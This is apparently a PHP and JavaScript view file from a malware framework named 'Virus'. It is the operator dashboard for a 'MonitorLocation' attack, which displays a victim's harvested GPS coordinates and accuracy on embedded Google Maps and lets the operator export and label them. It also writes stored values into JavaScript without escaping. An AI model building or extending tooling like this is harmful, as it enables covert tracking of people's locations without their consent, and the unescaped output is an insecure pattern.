<?php

use function Kelvinho\Virus\map;

global $timezone;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation\MonitorLocation $attack */

/** @var \Kelvinho\Virus\User\User $user */

\Kelvinho\Virus\Singleton\BackgroundAttacks::js($attack); ?>
<script>
    class Event extends BaseEvent {
        constructor(unixTime, lat, lng, acc, name, displayTime) {
            super();
            this.unixTime = unixTime;
            this.lat = lat;
            this.lng = lng;
            this.acc = acc;
            this.displayTime = displayTime;
            this.name = name ?? "";
            this.zoomLevel = Math.log2(591657550.5 / (parseInt(this.acc) * 18)) + 1;
        }

        renderContent(forStream) {
            return `<iframe src="https://maps.google.com/maps?q=` + this.lat + `,` + this.lng + `&z=` + Math.round(this.zoomLevel) + `&output=embed"
                                              width="100%"
                                              height="100%" style="border:0"></iframe>`;
        }

        export() {
            return JSON.stringify({
                "lat": this.lat,
                "lng": this.lng,
                "acc": this.acc,
                "name": this.name
            });
        }

        getName() {
            return this.name;
        }

        setName(name) {
            this.name = name;
        }

        getDisplayTime() {
            return this.displayTime;
        }
    }

    /** @type {Object.<number, BaseEvent>} */
    const events = {<?php echo implode(", ", map($attack->getEvents(), function ($values, int $unixTime) use ($user, $timezone) {
            return $unixTime . ': new Event(' . $unixTime . ', "' . $values["lat"] . '", "' . $values["lng"] . '", "' . $values["acc"] . '", "' . $values["name"] . '", "' . $timezone->display($user->getTimezone(), $unixTime) . '")';
        })); ?>};
    const context = setupBackgroundAttacksJs(events, [<?php echo implode(", ", $attack->getSavedEvents()); ?>].reverse())
</script>
